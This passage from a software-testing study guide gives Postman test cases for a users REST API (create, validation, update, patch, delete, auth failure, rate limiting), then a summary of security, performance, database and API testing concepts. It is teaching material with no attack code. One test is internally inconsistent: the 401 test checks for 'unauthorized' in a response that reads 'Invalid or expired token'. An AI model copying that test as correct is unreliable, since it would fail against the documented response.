    pm.expect(jsonData.data).to.have.property('id');
    pm.expect(jsonData.data.id).to.be.a('number');
});

pm.test("Response contains created user data", function () {
    const jsonData = pm.response.json();
    pm.expect(jsonData.data.name).to.eql("Test User");
});

pm.test("Password not returned in response", function () {
    const jsonData = pm.response.json();
    pm.expect(jsonData.data).to.not.have.property('password');
});

// Save new user ID
pm.environment.set("new_user_id", pm.response.json().data.id);
```

TEST 5: POST with invalid data
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Method: POST
URL: https://api.example.com/api/users
Body (JSON):
{
  "name": "",
  "email": "invalid-email",
  "password": "123"
}

Response:
Status: 400 Bad Request OR 422 Unprocessable Entity
Body:
{
  "errors": {
    "name": ["Name is required"],
    "email": ["Email format is invalid"],
    "password": ["Password must be at least 8 characters"]
  }
}

TESTS:
```javascript
pm.test("Status code is 400 or 422", function () {
    pm.expect(pm.response.code).to.be.oneOf([400, 422]);
});

pm.test("Validation errors present", function () {
    const jsonData = pm.response.json();
    pm.expect(jsonData).to.have.property('errors');
});

pm.test("Error for name field", function () {
    const jsonData = pm.response.json();
    pm.expect(jsonData.errors).to.have.property('name');
});
```

TEST 6: PUT update user
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Method: PUT
URL: https://api.example.com/api/users/{{new_user_id}}
Body (JSON):
{
  "name": "Updated Name",
  "email": "updated@example.com"
}

Response:
Status: 200 OK
Body:
{
  "data": {
    "id": 3,
    "name": "Updated Name",
    "email": "updated@example.com",
    "updated_at": "2026-01-10T15:35:00Z"
  }
}

TESTS:
```javascript
pm.test("Status code is 200", function () {
    pm.response.to.have.status(200);
});

pm.test("User data updated", function () {
    const jsonData = pm.response.json();
    pm.expect(jsonData.data.name).to.eql("Updated Name");
});

pm.test("Updated timestamp present", function () {
    const jsonData = pm.response.json();
    pm.expect(jsonData.data).to.have.property('updated_at');
});
```

TEST 7: PATCH partial update
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Method: PATCH
URL: https://api.example.com/api/users/{{new_user_id}}
Body (JSON):
{
  "name": "Partially Updated"
}

Response:
Status: 200 OK
Body:
{
  "data": {
    "id": 3,
    "name": "Partially Updated",
    "email": "updated@example.com",
    "updated_at": "2026-01-10T15:40:00Z"
  }
}

TESTS:
```javascript
pm.test("Status code is 200", function () {
    pm.response.to.have.status(200);
});

pm.test("Only specified field updated", function () {
    const jsonData = pm.response.json();
    pm.expect(jsonData.data.name).to.eql("Partially Updated");
    pm.expect(jsonData.data.email).to.eql("updated@example.com"); // unchanged
});
```

TEST 8: DELETE user
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Method: DELETE
URL: https://api.example.com/api/users/{{new_user_id}}
Headers:
  Authorization: Bearer {{auth_token}}

Response:
Status: 204 No Content OR 200 OK
Body: (empty) OR {"message": "User deleted successfully"}

TESTS:
```javascript
pm.test("Status code is 204 or 200", function () {
    pm.expect(pm.response.code).to.be.oneOf([200, 204]);
});

// Verify deletion
pm.test("Deleted user no longer exists", function () {
    pm.sendRequest({
        url: pm.environment.get("base_url") + "/api/users/" + pm.environment.get("new_user_id"),
        method: 'GET',
        header: {
            'Authorization': 'Bearer ' + pm.environment.get("auth_token")
        }
    }, function (err, response) {
        pm.expect(response.code).to.eql(404);
    });
});
```

TEST 9: Authentication failure
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Method: GET
URL: https://api.example.com/api/users
Headers:
  Authorization: Bearer invalid_token

Response:
Status: 401 Unauthorized
Body:
{
  "error": "Invalid or expired token"
}

TESTS:
```javascript
pm.test("Status code is 401", function () {
    pm.response.to.have.status(401);
});

pm.test("Error message indicates auth failure", function () {
    const jsonData = pm.response.json();
    pm.expect(jsonData.error.toLowerCase()).to.include('unauthorized');
});
```

TEST 10: Rate limiting
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Send 100 requests rapidly

Response (after limit):
Status: 429 Too Many Requests
Headers:
  Retry-After: 60
  X-RateLimit-Limit: 100
  X-RateLimit-Remaining: 0
  X-RateLimit-Reset: 1735679340
Body:
{
  "error": "Rate limit exceeded. Try again in 60 seconds."
}

TESTS:
```javascript
pm.test("Status code is 429", function () {
    pm.response.to.have.status(429);
});

pm.test("Retry-After header present", function () {
    pm.response.to.have.header("Retry-After");
});

pm.test("Rate limit headers present", function () {
    pm.response.to.have.header("X-RateLimit-Limit");
    pm.response.to.have.header("X-RateLimit-Remaining");
});
```

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
POSTMAN FEATURES
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1. ENVIRONMENTS
   Create variables for different environments:
   - base_url: https://api.example.com
   - auth_token: your_token_here
   Usage in requests: {{base_url}}/api/users

2. COLLECTIONS
   Organize related requests together
   Run entire collection with one click
   Share collections with team

3. PRE-REQUEST SCRIPTS
   Run code before sending request
   Example: Generate timestamp
   ```javascript
   pm.environment.set("timestamp", Date.now());
   ```

4. TESTS (POST-REQUEST SCRIPTS)
   Validate responses
   Extract data for later use
   Chain requests

5. COLLECTION RUNNER
   Run entire collection
   Run multiple iterations
   Load test data from CSV/JSON
   Generate report

6. NEWMAN (CLI tool)
   Run Postman collections from command line
   Integrate with CI/CD pipelines
   ```
   newman run collection.json -e environment.json
   ```

7. MOCK SERVERS
   Create mock API responses
   Test frontend before backend ready

8. API DOCUMENTATION
   Auto-generate documentation from collections
   Share with team

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
```

---

## Summary & Key Takeaways

### Day 9 Key Concepts:

1. **Security Testing:**
   - OWASP Top 10 vulnerabilities
   - SQL Injection testing and prevention
   - XSS (Reflected, Stored, DOM-based)
   - CSRF attacks and tokens
   - Authentication and Authorization testing
   - Session management security

2. **Performance Testing:**
   - Page load time benchmarks (< 2 seconds ideal)
   - Response time for user actions (< 1 second)
   - Bottleneck identification (images, blocking resources, slow queries)
   - Chrome DevTools for performance analysis

3. **Database Testing:**
   - Data integrity (constraints, foreign keys)
   - CRUD operations validation
   - Transaction testing
   - Data consistency

4. **API Testing:**
   - REST API principles
   - HTTP methods (GET, POST, PUT, PATCH, DELETE)
   - Status codes (2XX success, 4XX client error, 5XX server error)
   - Postman for API testing
   - Request/Response validation

### Security Best Practices:

✓ Use parameterized queries (prevent SQL injection)
✓ Sanitize all user input (prevent XSS)
✓ Implement CSRF tokens
✓ Enforce strong authentication
✓ Check authorization on every request
✓ Use HTTPS everywhere
✓ Set security headers (CSP, X-Frame-Options)
✓ HttpOnly and Secure flags on cookies

### Tomorrow's Preview:

Day 10 will cover:
- Mobile Application Testing
- Native vs Hybrid vs Web apps
- Mobile-specific testing (gestures, interruptions, orientation)
- Device compatibility testing
- iOS and Android testing differences

---

**Congratulations on completing Day 9!**

**Study Time:** 5-6 hours

---

*End of Day 9 Study Guide*
